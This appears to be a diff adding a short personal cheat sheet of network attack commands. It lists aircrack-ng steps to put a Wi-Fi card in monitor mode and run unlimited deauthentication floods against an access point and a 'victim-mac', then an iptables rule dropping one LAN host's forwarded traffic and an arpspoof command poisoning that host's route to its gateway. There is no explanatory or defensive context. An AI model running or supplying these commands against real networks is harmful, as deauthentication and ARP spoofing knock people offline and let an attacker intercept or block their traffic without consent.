@@ -1,0 +1,9 @@
+airmon-ng start/stop
+iwconfig wlan0mon channel 6
+airodump-ng -c 8 wlan0mon
+aireplay-ng -0 0 -a ap-mac -c victim-mac wlan0mon
+
+iptables -t filter -A FORWARD -s 192.168.102.81 -j DROP
+arpspoof -i enp2s0 -c own -t 192.168.102.81 192.168.102.254
+airodump-ng -i wlan0mon
+aireplay-ng -0 0 -a 3E:8D:17:FF:4F:FF wlan0mon
